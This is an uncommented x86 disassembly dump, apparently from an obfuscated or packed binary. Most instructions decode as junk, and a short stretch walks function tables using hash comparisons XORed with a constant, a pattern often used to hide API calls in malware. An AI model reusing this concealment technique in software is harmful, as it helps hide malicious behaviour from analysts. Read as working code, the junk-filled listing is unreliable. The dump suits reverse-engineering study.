  414843:	not    DWORD PTR [esi+0x4d8bce99]
  414849:	clc    
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x4147f0
  414861:	adc    ebx,DWORD PTR [ecx-0x38]
  414864:	adc    bh,BYTE PTR [ebp+0x7f]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4148a9
  41486d:	(bad)  
  41486e:	(bad)  
  41486f:	mov    edx,0x460b7bce
  414874:	xchg   BYTE PTR [edi+0x6b],cl
  414877:	pop    ss
  414878:	push   ds
  414879:	add    eax,0x4311b0eb
  41487e:	jb     0x4148bc
  414880:	pusha  
  414881:	pop    es
  414882:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414884:	adc    ebp,esi
  414886:	mov    WORD PTR [edx],es
  414888:	add    eax,0xa13980a9
  41488d:	es sbb ah,ch
  414890:	jecxz  0x4148d3
  414892:	sbb    eax,0xc61ca281
  414897:	pop    ebp
  414898:	jg     0x41483a
  41489a:	mov    ecx,0xc11da73e
  41489f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148a0:	test   BYTE PTR [eax+edi*2+0x27],dl
  4148a4:	jns    0x4148fa
  4148a6:	mov    dh,0x76
  4148a8:	dec    ebx
  4148a9:	pop    ecx
  4148aa:	out    0xfa,al
  4148ac:	or     BYTE PTR [edi+0x79],ch
  4148af:	scas   eax,DWORD PTR es:[edi]
  4148b0:	mov    al,ds:0x7c41427c
  4148b5:	pop    ds
  4148b6:	fmul   QWORD PTR [eax+0x40]
  4148b9:	cmp    al,ah
  4148bb:	clc    
  4148bc:	jns    0x414905
  4148be:	adc    DWORD PTR [ebp+0x25],eax
  4148c1:	in     al,0x3d
  4148c3:	mov    ah,0x8f
  4148c5:	into   
  4148c6:	test   DWORD PTR [ebp+0x49],esp
  4148c9:	lahf   
  4148ca:	(bad)  
  4148cb:	retf   0x6f64
  4148ce:	xchg   DWORD PTR [ecx+0x4f],ecx
  4148d1:	imul   esi,DWORD PTR [edx+0x5d],0xd854bf52
  4148d8:	loop   0x41493c
  4148da:	cmp    eax,0x531d3b17
  4148df:	aam    0x83
  4148e1:	sub    al,BYTE PTR [edx+0x7094c678]
  4148e7:	cmp    al,0xe3
  4148e9:	xchg   DWORD PTR [edi-0x63],eax
  4148ec:	pop    ss
  4148ed:	pushf  
  4148ee:	xchg   esi,eax
  4148ef:	and    ch,BYTE PTR [edi]
  4148f1:	inc    edx
  4148f2:	cld    
  4148f3:	sub    esi,DWORD PTR [edi+edx*4-0x5481879d]
  4148fa:	cld    
  4148fb:	imul   eax
  4148fd:	xchg   sp,ax
  4148ff:	mov    ebx,0x496dfc47
  414904:	out    dx,al
  414905:	and    eax,0xd84b0b29
  41490a:	and    eax,0x2ce8054d
  41490f:	repnz ds iret 
  414912:	sub    ecx,DWORD PTR [edi+0x5854631c]
  414918:	and    ebx,edx
  41491a:	fwait
  41491b:	adc    edx,0xa7d138d2
  414921:	push   ss
  414922:	or     DWORD PTR [esi],0xffffffb9
  414925:	(bad)  
  414926:	test   DWORD PTR [bp-0x72f6],0x49bd9e55
  41492f:	sub    al,0xc0
  414931:	ins    DWORD PTR es:[edi],dx
  414932:	ret    0x1148
  414935:	fmul   QWORD PTR [esi-0x4f8f82fa]
  41493b:	jo     0x414946
  41493d:	pop    ebp
  41493e:	sar    DWORD PTR [ebx-0x16bcc1d2],0x64
  414945:	in     al,0xcd
  414947:	jo     0x4148f7
  414949:	pop    esi
  41494a:	sub    DWORD PTR [esi+0x2751b74],ecx
  414950:	mov    dh,0x37
  414952:	lods   al,BYTE PTR ds:[esi]
  414953:	fnstsw WORD PTR [edi+0x6d]
  414956:	ret    
  414957:	inc    edx
  414958:	test   eax,0xc975b8e5
  41495d:	fldcw  WORD PTR [esi-0x257c2729]
  414963:	lahf   
  414964:	and    ecx,DWORD PTR ds:0xaa75486
  41496a:	xor    edi,DWORD PTR [edi*8-0x45e2cfda]
  414971:	fisttp QWORD PTR [ebp-0x165a8a9e]
  414977:	je     0x414921
  414979:	mov    eax,ds:0xe7dc82cc
  41497e:	xchg   esp,eax
  41497f:	mov    ecx,0xbe200738
  414984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414985:	das    
  414986:	ins    DWORD PTR es:[edi],dx
  414987:	mov    dh,0x58
  414989:	aam    0x69
  41498b:	dec    edi
  41498c:	add    DWORD PTR [edi],0xffffffdd
  41498f:	mov    ah,0xfa
  414991:	xor    esi,DWORD PTR ds:0x28f0480
  414997:	mov    dl,0x4a
  414999:	sbb    DWORD PTR [eax],edi
  41499b:	jbe    0x414942
  41499d:	in     al,0x36
  41499f:	test   DWORD PTR [eax],0x6a970418
  4149a5:	xchg   esi,eax
  4149a6:	nop
  4149a7:	or     dh,BYTE PTR [eax-0x1e59a1eb]
  4149ad:	push   ds
  4149ae:	daa    
  4149af:	ret    0x33c8
  4149b2:	rcr    DWORD PTR [ecx-0x369c52ec],cl
  4149b8:	enter  0xbee1,0xe9
  4149bc:	sub    bl,0xc6
  4149bf:	clc    
  4149c0:	add    dh,BYTE PTR [esi+ebx*2-0x78]
  4149c4:	daa    
  4149c5:	cmp    ch,dl
  4149c7:	imul   esp,DWORD PTR [esi+0x12],0x4a
  4149cb:	lock wrmsr 
  4149ce:	sub    ch,cl
  4149d0:	loope  0x414a12
  4149d2:	ins    BYTE PTR es:[edi],dx
  4149d3:	aad    0x7a
  4149d5:	mov    al,ds:0x4305b716
  4149da:	pop    ds
  4149db:	dec    eax
  4149dc:	inc    esp
  4149dd:	cmp    al,0x12
  4149df:	mov    WORD PTR [edx-0x4fa3fa9d],ss
  4149e5:	data16 sbb al,0xc0
  4149e8:	(bad)  
  4149e9:	popa   
  4149ea:	test   al,0xda
  4149ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149ed:	in     eax,0xd5
  4149ef:	test   DWORD PTR [edi-0x28],ebx
  4149f2:	mov    ecx,?
  4149f4:	cmp    BYTE PTR [edx+0x7114933c],bh
  4149fa:	and    dh,ch
  4149fc:	sbb    eax,DWORD PTR [ecx-0x7f]
  4149ff:	popf   
  414a00:	push   ecx
  414a01:	xor    BYTE PTR [esi-0x4162c96a],bl
  414a07:	shr    DWORD PTR [eax+edi*2-0x6c278aa4],0xf7
  414a0f:	mov    eax,ds:0x9ba9a990
  414a14:	inc    ebx
  414a15:	data16 mov cs,WORD PTR [ebx-0x77ee81ad]
  414a1c:	in     eax,0x4b
  414a1e:	iret   
  414a1f:	ret    0x1e49
  414a22:	mov    dh,BYTE PTR [eax+0xfbcd08]
  414a28:	ret    0x55fa
  414a2b:	fucomi st,st(7)
  414a2d:	pop    esi
  414a2e:	mov    ch,0x3a
  414a30:	xchg   ecx,eax
  414a31:	xchg   esi,eax
  414a32:	xchg   esi,eax
  414a33:	sbb    esi,ebx
  414a35:	jl     0x4149dd
  414a37:	lods   eax,DWORD PTR ds:[esi]
  414a38:	jmp    DWORD PTR [ebp+0x31]
  414a3b:	fsub   QWORD PTR [edi+edx*1+0x6467fa05]
  414a42:	bound  edx,QWORD PTR [edi+0x44]
  414a45:	push   ebx
  414a46:	das    
  414a47:	dec    eax
  414a48:	dec    eax
  414a49:	jb     0x4149d4
  414a4b:	mov    DWORD PTR [eax-0x43be937b],ebp
  414a51:	pushf  
  414a52:	xor    BYTE PTR [ebx],bh
  414a54:	push   0x60e3ba8e
  414a59:	push   edi
  414a5a:	out    dx,eax
  414a5b:	loope  0x414ad1
  414a5d:	(bad)  
  414a5e:	xor    DWORD PTR [edx+edi*8-0x69],edi
  414a62:	cmp    dh,BYTE PTR [ebx-0x3b]
  414a65:	sbb    DWORD PTR [edi],edx
  414a67:	push   ss
  414a68:	repnz les ebp,FWORD PTR [ebx]
  414a6b:	push   esp
  414a6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a6d:	arpl   WORD PTR [edi],bp
  414a6f:	enter  0x3620,0xe9
  414a73:	(bad)  
  414a75:	(bad)
  414a79:	lods   eax,DWORD PTR ds:[esi]
  414a7a:	push   edi
  414a7b:	mov    DWORD PTR [esi-0x3e402c07],eax
  414a81:	cwde   
  414a82:	lods   eax,DWORD PTR ds:[esi]
  414a83:	icebp  
  414a84:	sub    BYTE PTR [ebp-0xf],ah
  414a87:	arpl   WORD PTR [ebx-0x69],sp
  414a8a:	das    
  414a8b:	cmp    ecx,DWORD PTR [edi-0x70a99e0e]
  414a91:	or     BYTE PTR [eax],0xa9
  414a94:	imul   edx,DWORD PTR [edx+0x7239d3f8],0x5f5e77ba
  414a9e:	push   ebp
  414a9f:	xor    cl,ch
  414aa1:	mov    esp,0x64b75df
  414aa6:	into   
  414aa7:	fisub  DWORD PTR [edi]
  414aa9:	mov    dh,0x53
  414aab:	(bad)  
  414aac:	les    ebx,FWORD PTR [edi-0x41d6177f]
  414ab2:	push   esp
  414ab3:	stc    
  414ab4:	repz fsubr QWORD PTR [edx+0x48]
  414ab8:	ficom  DWORD PTR [ebx-0x78d00940]
  414abe:	fucomi st,st(0)
  414ac0:	dec    ebx
  414ac1:	call   0xbd21:0xbfee784e
  414ac8:	js     0x414a51
  414aca:	sbb    ebp,DWORD PTR [ebx-0x15]
  414acd:	(bad)
  414ad0:	xchg   edi,eax
  414ad1:	sub    al,0xf6
  414ad3:	inc    eax
  414ad4:	and    al,0xb
  414ad6:	and    al,0x41
  414ad8:	and    ch,cl
  414ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414adb:	xchg   ebp,eax
  414adc:	repnz xor DWORD PTR ds:0x820774c2,0x6c0c2b94
  414ae7:	into   
  414ae8:	shl    DWORD PTR [edi+0x71],0x99
  414aec:	push   ecx
  414aed:	pop    ds
  414aee:	outs   dx,DWORD PTR ds:[esi]
  414aef:	xchg   BYTE PTR [edi+eiz*8+0x1f1e8c03],ch
  414af6:	pop    ds
  414af7:	cld    
  414af8:	(bad)  
  414af9:	pop    esp
  414afa:	xchg   ecx,eax
  414afb:	jl     0x414b06
  414afd:	(bad)  
  414afe:	rcr    ebp,cl
  414b00:	mov    edi,0x7eddc7f1
  414b05:	hlt    
  414b06:	jle    0x414ab2
  414b08:	call   0xb6366b51
  414b0d:	mov    bl,0xdb
  414b0f:	std    
  414b10:	cmp    ax,0x59f0
  414b14:	mov    al,0x89
  414b16:	daa    
  414b17:	(bad)  
  414b18:	in     al,dx
  414b19:	add    BYTE PTR [ebp+0x37e4e1c],dl
  414b1f:	adc    al,0xa
  414b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b22:	and    edx,DWORD PTR [esi-0x5b]
  414b25:	mov    edi,0xaf3d8921
  414b2a:	into   
  414b2b:	jns    0x414b13
  414b2d:	mov    esi,0xef23719c
  414b32:	js     0x414b37
  414b34:	ret    
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	pop    ebp
  414bb7:	mov    al,ds:0x7b5b7fdf
  414bbc:	jg     0x414c2e
  414bbe:	mov    ecx,0x4870707e
  414bc3:	dec    ebp
  414bc4:	or     al,0xf
  414bc6:	add    DWORD PTR [ebp+0x2363f3cd],0x6c67202e
  414bd0:	push   DWORD PTR [esi+0x7be044c5]
  414bd6:	mov    edi,0xe4cf886
  414bdb:	and    eax,0x1d9c3b44
  414be0:	hlt    
  414be1:	fisubr WORD PTR [ecx-0x4d]
  414be4:	int    0xf5
  414be6:	mov    bl,0x3
  414be8:	xor    eax,0xce44f20
  414bed:	cli    
  414bee:	das    
  414bef:	cmp    al,0xba
  414bf1:	ss cdq 
  414bf3:	mov    cl,0xb9
  414bf5:	sub    bl,BYTE PTR [ebx+0x6eafcb46]
  414bfb:	xor    DWORD PTR [esi+0x1315c467],0xffffffa7
  414c02:	lods   al,BYTE PTR ds:[esi]
  414c03:	pop    ss
  414c04:	loopne 0x414bd2
  414c06:	aad    0x78
  414c08:	aad    0xbb
  414c0a:	pop    ecx
  414c0b:	pop    ss
  414c0c:	sbb    BYTE PTR [ecx+ebp*8],cl
  414c0f:	mov    bh,0xf7
  414c11:	mov    ds:0x32eb1f0f,eax
  414c16:	addr16 lahf 
  414c18:	addr16 aam 0x55
  414c1b:	add    ebx,edi
  414c1d:	jmp    0xd1e2:0x9367e38a
  414c24:	pop    ecx
  414c25:	data16 mov cl,0xd5
  414c28:	pop    ebp
  414c29:	bnd jmp 0xba8a67d0
  414c2f:	inc    esi
  414c30:	sbb    al,0x3a
  414c32:	or     dl,BYTE PTR [ebx]
  414c34:	cmc    
  414c35:	stc    
  414c36:	sbb    ecx,DWORD PTR [edx+eax*2]
  414c39:	loope  0x414c17
  414c3b:	inc    ebp
  414c3c:	aas    
  414c3d:	in     eax,dx
  414c3e:	xlat   BYTE PTR ds:[ebx]
  414c3f:	mov    dl,0x6
  414c41:	pop    ecx
  414c42:	sar    DWORD PTR [ebx+0x4d],cl
  414c45:	ins    DWORD PTR es:[edi],dx
  414c46:	nop
  414c47:	fstp   TBYTE PTR [eax-0x334350b9]
  414c4d:	loopne 0x414bf1
  414c4f:	mov    ecx,0x2b80dcc9
  414c54:	lea    ebx,[esi-0x20]
  414c57:	ss test BYTE PTR ss:[edi+0x5cfbf872],cl
  414c5f:	xchg   esi,eax
  414c60:	je     0x414cd4
  414c62:	pushf  
  414c63:	call   0x88f736bd
  414c68:	xchg   BYTE PTR [ebx-0x7e],ch
  414c6b:	loope  0x414c6d
  414c6d:	popa   
  414c6e:	xchg   edi,eax
  414c6f:	je     0x414ce4
  414c71:	iret   
  414c72:	frstor [eax-0x833608f]
  414c78:	jl     0x414ceb
  414c7a:	xlat   BYTE PTR ds:[ebx]
  414c7b:	add    dh,BYTE PTR [eax+esi*8-0x435fdaef]
  414c82:	pop    ebp
  414c83:	push   edx
  414c84:	jne    0x414cfb
  414c86:	hlt    
  414c87:	bound  ecx,QWORD PTR [eax]
  414c89:	fisub  DWORD PTR [esi-0x33358aec]
  414c8f:	xchg   ebp,eax
  414c90:	fdiv   QWORD PTR [edx]
  414c92:	lods   al,BYTE PTR ds:[esi]
  414c93:	clc    
  414c94:	xor    DWORD PTR [edx+0x14fc5f9e],eax
  414c9a:	push   ds
  414c9b:	jo     0x414c24
  414c9d:	push   ebx
  414c9e:	retf   
  414c9f:	dec    edx
  414ca0:	nop
  414ca1:	int    0x5c
  414ca3:	sub    DWORD PTR [ebx-0x63d963dd],edx
  414ca9:	lds    ebp,FWORD PTR [ebp-0x3d]
  414cac:	mov    ecx,0xc2eafe08
  414cb1:	xchg   ebp,eax
  414cb2:	es cwde 
  414cb4:	mov    esi,0xcdd49bd
  414cb9:	loop   0x414c5d
  414cbb:	cmp    ah,BYTE PTR [esp+ecx*1-0x2fbe56d4]
  414cc2:	push   es
  414cc3:	add    eax,0x7c754658
  414cc8:	push   ss
  414cc9:	and    al,0x88
  414ccb:	bound  ebp,QWORD PTR [ecx+0x4a]
  414cce:	(bad)  
  414ccf:	jl     0x414d2a
  414cd1:	test   BYTE PTR [edi],bh
  414cd3:	int    0xdb
  414cd5:	mov    cl,BYTE PTR [edi]
  414cd7:	jb     0x414ca7
  414cd9:	bound  ecx,QWORD PTR [edx]
  414cdb:	call   0xfb8f:0xe36a7f13
  414ce2:	or     al,0x7a
  414ce4:	xor    ebx,esi
  414ce6:	cmp    DWORD PTR [eax-0x78d2ceaa],edx
  414cec:	adc    BYTE PTR [ebp+0x2beeefab],bl
  414cf2:	test   al,0x3e
  414cf4:	out    0x11,al
  414cf6:	cmp    ch,ch
  414cf8:	jmp    0x414cf4
  414cfa:	mov    al,ds:0x2bed6d03
  414cff:	pop    edx
  414d00:	cs out dx,eax
  414d02:	push   esp
  414d03:	fsub   DWORD PTR [ebx-0x44371e2d]
  414d09:	imul   ebx,DWORD PTR [ebp-0x2b1dc71d],0xffffff91
  414d10:	mov    ch,0x96
  414d12:	cmp    eax,0xcb58a85c
  414d17:	fcomp  DWORD PTR [eax]
  414d1a:	and    BYTE PTR [ebp-0x6594b85f],bh
  414d20:	stos   BYTE PTR es:[edi],al
  414d21:	imul   ebx,DWORD PTR [esi],0xf87c4ce3
  414d27:	dec    ecx
  414d28:	push   ds
  414d29:	push   ebp
  414d2a:	mov    fs,sp
  414d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d2e:	test   edx,ebp
  414d30:	pop    esi
  414d31:	jg     0x414d2b
  414d33:	pop    ss
  414d34:	in     eax,0xab
  414d36:	cmp    ch,dl
  414d38:	imul   esi,DWORD PTR [esi+esi*1-0x67],0xf0eb09d1
  414d40:	push   cs
  414d41:	mov    esp,0x778eea8c
  414d46:	enter  0x84a2,0x33
  414d4a:	add    ch,BYTE PTR [ecx]
  414d4c:	fnstenvw [edi]
  414d4f:	pop    edi
  414d50:	fdiv   DWORD PTR [ebp+0x1a]
  414d53:	inc    ecx
  414d54:	sub    dl,BYTE PTR [ebp-0x65be5fa4]
  414d5a:	arpl   si,di
  414d5c:	(bad)  
  414d5d:	ds push esi
  414d5f:	add    BYTE PTR [ebx+0x10],bl
  414d62:	ret    0xfc7c
  414d65:	inc    edx
  414d66:	add    BYTE PTR [ecx-0x6220542d],bh
  414d6c:	mov    ebx,0xf3449f43
  414d71:	inc    esi
  414d72:	test   DWORD PTR [ecx-0x24],esp
  414d75:	call   0xb9de:0xdba2dd0d
  414d7c:	sahf   
  414d7d:	cmp    cl,BYTE PTR [bx+si+0x7ab7]
  414d82:	iret   
  414d83:	dec    edi
  414d84:	pop    esi
  414d85:	aad    0xfc
  414d87:	mov    ah,0x95
  414d89:	xor    al,0x71
  414d8b:	xchg   ecx,eax
  414d8c:	cmp    eax,0xf6fee919
  414d91:	or     edi,eax
  414d93:	lds    ecx,FWORD PTR [edx]
  414d95:	dec    eax
  414d96:	lods   al,BYTE PTR ds:[esi]
  414d97:	shl    DWORD PTR [eax+eiz*1],cl
  414d9a:	pop    es
  414d9b:	idiv   DWORD PTR [ecx]
  414d9d:	imul   esp,DWORD PTR [esi-0x3c],0xffffff98
  414da1:	jg     0x414d8e
  414da3:	fstp   st(7)
  414da5:	jne    0x414d83
  414da7:	mov    ah,0x42
  414da9:	daa    
  414daa:	pop    esi
  414dab:	lods   eax,DWORD PTR ds:[esi]
  414dac:	push   edx
  414dad:	adc    al,al
  414daf:	sbb    eax,0xd03703ab
  414db4:	lahf   
  414db5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414db6:	in     al,0xb7
  414db8:	cs call 0x4a69:0xb65e1ed2
  414dc0:	rcl    BYTE PTR [edi+0x6e],1
  414dc3:	adc    al,0x2b
  414dc5:	mov    es,WORD PTR [esi]
  414dc7:	mov    ch,0xf5
  414dc9:	ja     0x414da3
  414dcb:	inc    esi
  414dcc:	inc    edx
  414dcd:	mov    BYTE PTR ds:0x4cac216c,ah
  414dd3:	jl     0x414dc9
  414dd5:	loop   0x414e2f
  414dd7:	mov    dl,0x4
  414dd9:	mov    al,ds:0xb96d859d
  414dde:	push   esi
  414ddf:	xor    al,0xf
  414de1:	mov    esi,0x7d20ce0
  414de6:	jge    0x414e5c
  414de8:	es (bad) 
  414deb:	stos   BYTE PTR es:[edi],al
  414dec:	mov    cl,0x98
  414dee:	dec    edx
  414def:	or     cl,BYTE PTR [edx+0x34efb142]
  414df5:	sar    BYTE PTR [ebx+0x45],cl
  414df8:	mov    cl,0xa6
  414dfa:	mov    bl,BYTE PTR [edx*4-0x9b8885f]
  414e01:	pushf  
  414e02:	popf   
  414e03:	out    dx,al
  414e04:	pop    ds
  414e05:	test   dh,dl
  414e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e08:	pop    ds
  414e09:	pop    ecx
  414e0a:	imul   edi,DWORD PTR [ecx-0x49870f62],0xffffff98
  414e11:	ret    0x14d2
  414e14:	imul   ebp,esp,0x5
  414e17:	pushf  
  414e18:	push   cs
  414e19:	fild   QWORD PTR [eax-0x2b0211fe]
  414e1f:	push   eax
  414e20:	mov    edi,DWORD PTR gs:[esi+edi*1]
  414e24:	fs out dx,al
  414e26:	dec    DWORD PTR [edi-0x1d]
  414e29:	mov    ds:0xdf45b34c,al
  414e2e:	jno    0x414e12
  414e30:	dec    ebx
  414e31:	pop    ss
  414e32:	retf   
  414e33:	xchg   esi,eax
  414e34:	inc    edx
  414e35:	xor    DWORD PTR [ebp-0x41],eax
  414e38:	call   0x481b3331
  414e3d:	jne    0x414dee
  414e3f:	fdiv   st(3),st
  414e41:	inc    ebp
  414e42:	pushf  
  414e43:	in     al,0x5
  414e45:	xchg   DWORD PTR [edi+0x17102435],edi
  414e4b:	jns    0x414ddb
  414e4d:	ss xchg edi,eax
  414e4f:	dec    esp
  414e50:	jge    0x414e8c
  414e52:	lods   eax,DWORD PTR ds:[esi]
  414e53:	stos   DWORD PTR es:[edi],eax
  414e54:	mov    esp,0xfde31332
  414e59:	sub    edi,DWORD PTR [eax-0x6]
  414e5c:	outs   dx,BYTE PTR ds:[esi]
  414e5d:	xchg   ecx,eax
  414e5e:	cdq    
  414e5f:	mov    DWORD PTR [edx+0x7a67a9aa],edx
  414e65:	fcom   DWORD PTR [esi+ecx*8-0x45e37232]
  414e6c:	into   
  414e6d:	xchg   esp,eax
  414e6e:	inc    ecx
  414e6f:	mov    ah,0xff
  414e71:	int3   
  414e72:	loope  0x414e69
  414e74:	xchg   ebp,eax
  414e75:	scas   eax,DWORD PTR es:[edi]
  414e76:	xor    BYTE PTR [eax],cl
  414e78:	pop    eax
  414e79:	jbe    0x414e5d
  414e7b:	jp     0x414ec8
  414e7d:	xchg   ebx,eax
  414e7e:	imul   eax,DWORD PTR [esi+0x31],0x64
  414e82:	cdq    
  414e83:	mov    esp,0x226c7c19
  414e88:	dec    ecx
  414e89:	pop    ecx
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	gs push cs
  414eae:	sbb    eax,0x7f78a4f8
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414eff
  414eb9:	mov    DWORD PTR [edi+0x14efe58a],ebp
  414ebf:	call   0x3a19:0x2284ecca
  414ec6:	aaa    
  414ec7:	lahf   
  414ec8:	cmp    eax,0xf7f04091
  414ecd:	sar    ah,1
  414ecf:	mov    dh,0xee
  414ed1:	fs mov ebp,0xfeb1e5e6
  414ed7:	(bad)  
  414ed8:	mov    esi,0xd546b362
  414edd:	jnp    0x414e9b
  414edf:	mov    cl,0xe5
  414ee1:	pop    esi
  414ee2:	pushf  
  414ee3:	mov    DWORD PTR [edx-0x35],eax
  414ee6:	inc    edx
  414ee7:	jmp    FWORD PTR [ecx+0x2514b05f]
  414eed:	jb     0x414ef1
  414eef:	div    BYTE PTR [edi+0x200ba323]
  414ef5:	adc    bh,BYTE PTR [ebx+0x1dc79946]
  414efb:	mov    ecx,0xcb5b2e87
  414f00:	dec    esi
  414f01:	inc    eax
  414f02:	test   DWORD PTR ds:0xfe5424f3,ebx
  414f08:	ins    DWORD PTR es:[edi],dx
  414f09:	cmp    esp,DWORD PTR [eax-0x74]
  414f0c:	or     ecx,DWORD PTR [edi+ebp*8-0x57febf11]
  414f13:	and    BYTE PTR [esi],bh
  414f15:	(bad)  
  414f16:	mov    cl,0x92
  414f18:	cmp    dl,dl
  414f1a:	or     eax,0x8cb4df26
  414f1f:	fxch   st(2)
  414f21:	mov    dh,0x19
  414f23:	fstp   QWORD PTR [ebp+eax*1+0x46ace596]
  414f2a:	jnp    0x414f9d
  414f2c:	and    ch,BYTE PTR [ebx-0x3f]
  414f2f:	icebp  
  414f30:	xor    eax,0xc23d6869
  414f35:	add    al,0x52
  414f37:	adc    eax,0x2e64e731
  414f3c:	mov    ebx,0xf4461689
  414f41:	xor    BYTE PTR [ebp-0x80],ah
  414f44:	jle    0x414f3a
  414f46:	in     al,0xef
  414f48:	dec    eax
  414f49:	call   0x8b90:0xd31b1a9b
  414f50:	xor    al,0x6d
  414f52:	mov    ch,0xd9
  414f54:	add    edi,edx
  414f56:	scas   eax,DWORD PTR es:[edi]
  414f57:	adc    esp,DWORD PTR [esi+0x69]
  414f5a:	dec    edi
  414f5b:	mov    WORD PTR [edx+0x32],ds
  414f5e:	cmp    eax,0xbe28c7e6
  414f63:	aas    
  414f64:	xchg   BYTE PTR [ebx+0x33e17bad],al
  414f6a:	dec    eax
  414f6b:	fadd   QWORD PTR [ebp+0x47b4caad]
  414f71:	popa   
  414f72:	pop    esp
  414f73:	mov    eax,0x83d149d9
  414f78:	inc    edi
  414f79:	shl    DWORD PTR [edx-0x18],0x75
  414f7d:	dec    esi
  414f7e:	or     cl,BYTE PTR [edx+0x3c263ff5]
  414f84:	out    0xfc,al
  414f86:	hlt    
  414f87:	loope  0x414fab
  414f89:	jecxz  0x414f51
  414f8b:	cli    
  414f8c:	xor    ch,ch
  414f8e:	stc    
  414f8f:	inc    ebp
  414f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f91:	imul   esi,DWORD PTR [edx-0x13b83932],0xd01194a6
  414f9b:	popf   
  414f9c:	mov    dl,0xe0
  414f9e:	cmp    al,0xf9
  414fa0:	fptan  
  414fa2:	repz add BYTE PTR [ebx],bh
  414fa5:	adc    al,BYTE PTR [ebp+0x40]
  414fa8:	cld    
  414fa9:	and    ebp,DWORD PTR [esi]
  414fab:	jmp    0x44c9:0xe237168b
  414fb2:	xchg   BYTE PTR [ebp-0x79f4e1c8],ah
  414fb8:	xor    DWORD PTR [esi],edi
  414fba:	jbe    0x414fea
  414fbc:	xchg   eax,esp
  414fbe:	sub    DWORD PTR [ebp-0x14],edi
  414fc1:	inc    esp
  414fc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fc4:	inc    esp
  414fc5:	retf   
  414fc6:	cmp    ebx,ecx
  414fc8:	sub    DWORD PTR cs:[edx-0x8],ebp
  414fcc:	imul   ebp,DWORD PTR [ecx+0x2b50f14a],0x559128fd
  414fd6:	xor    BYTE PTR [edx-0x4f],dh
  414fd9:	out    0x66,al
  414fdb:	mov    esi,0xeb87bd6a
  414fe0:	jo     0x415036
  414fe2:	dec    edi
  414fe3:	daa    
  414fe4:	cld    
  414fe5:	arpl   WORD PTR [ecx],ax
  414fe7:	push   ecx
  414fe8:	ss iret 
  414fea:	iret   
  414feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fec:	std    
  414fed:	pop    esp
  414fee:	cwde   
  414fef:	push   ebx
  414ff0:	mov    eax,ds:0xde5bf0f7
  414ff5:	mov    ds:0x9966115f,eax
  414ffa:	jno    0x415010
  414ffc:	(bad)  
  414ffd:	mov    bh,0xc7
  414fff:	icebp  
  415000:	pop    ebx
  415001:	xchg   edi,eax
  415002:	dec    ebx
  415003:	mov    ah,0x84
  415005:	in     eax,dx
  415006:	ret    0x476c
  415009:	cmp    bh,BYTE PTR [ebx-0x20373971]
  41500f:	je     0x414fb7
  415011:	mov    ds:0x6040d68c,al
  415016:	xchg   BYTE PTR [ecx-0x19],al
  415019:	mov    edx,0xa308fbdc
  41501e:	lahf   
  41501f:	xchg   edi,eax
  415020:	sub    ah,BYTE PTR [edx]
  415022:	iret   
  415023:	daa    
  415024:	or     al,0xcc
  415026:	pop    ebx
  415027:	int3   
  415028:	outs   dx,DWORD PTR ds:[esi]
  415029:	push   eax
  41502a:	jle    0x41501c
  41502c:	and    BYTE PTR [edi],ah
  41502e:	(bad)  
